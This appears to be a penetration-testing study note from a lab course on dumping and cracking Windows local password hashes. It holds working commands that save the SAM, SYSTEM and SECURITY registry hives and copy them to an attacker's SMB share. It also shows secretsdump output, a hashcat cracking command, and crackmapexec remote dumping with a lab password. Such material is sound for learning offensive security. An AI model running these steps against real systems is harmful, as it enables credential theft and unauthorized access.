With access to a non-domain joined Windows computer, we can dump the SAM database (passwords) for cracking offline.

### hklm\\sam
Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.

### hklm\\system
Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.

### hklm\\security
Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.

We can use the ==reg.exe== utility to create backups of these.

## reg.exe
Launch `cmd.exe` as `Administrator`.

```cmd
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

*we only need sam and system, but security can be useful as it can contain hashes for caches domain user accounts*

## Create SMB Share

#### Start server on attack box
We can exfiltrate the backup using ==Impacket's smbserver.py== in combination with cmd commands.

- Name: CompData
- Output: /home/ltnbob/Documents
- Options: `- smb2support`

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

#### Move data from victim
```cmd
move sam.save \\<HOST IP>\CompData

move security.save \\<HOST IP>\CompData

move system.save \\<HOST IP>\CompData
```

## Dump the Hashes
Impacket can also dump hashes from the .save files with ==secretsdump.py==.

#### Locate
`locate secretsdump`

#### Run
```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Output:
```shell-session
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
```

Format:
`uid:rid:lmhash:nthash`

## Crack the Hashes
Populate a .txt with ==NT hashes== 
`sudo vim hashestocrack.txt`

Run hashcat against ==file==
`sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt`

## Remote Dumping
#### Dumping LSA Secrets Remotely
```shell-session
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

#### Dumping SAM Remotely
```shell-session
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

[[Demo Attacking SAM|Demo Attacking SAM]]